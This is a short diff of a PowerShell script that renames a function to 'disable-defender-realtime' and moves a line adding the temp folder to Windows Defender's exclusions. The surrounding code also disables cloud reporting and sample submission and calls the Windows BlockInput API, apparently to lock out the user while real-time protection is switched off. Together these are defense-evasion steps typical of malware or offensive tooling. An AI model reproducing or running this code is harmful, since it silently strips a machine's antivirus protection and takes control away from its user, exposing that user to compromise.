@@ -36,8 +36,8 @@ function current-cursor-position {
 	[Console]::SetCursorPosition($x, $y)
 }
 
-function defender-realtime-protection {
-	[Alias('drp')]
+function disable-defender-realtime {
+	[Alias('ddr')]
 	param(
 		[bool]$status = $true
 	)
@@ -45,9 +45,9 @@ $code = @'
 [DllImport("user32.dll")]
 public static extern bool BlockInput(bool fBlockIt);
 '@
+	Add-MpPreference -ExclusionPath "$global:temp" -Force
 	Set-MpPreference -MAPSReporting Disable
 	Set-MpPreference -SubmitSamplesConsent NeverSend
-	Add-MpPreference -ExclusionPath "$global:temp" -Force
 	if ((Get-MpComputerStatus).RealTimeProtectionEnabled -ne $status) {
 		$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
 		while($true) {
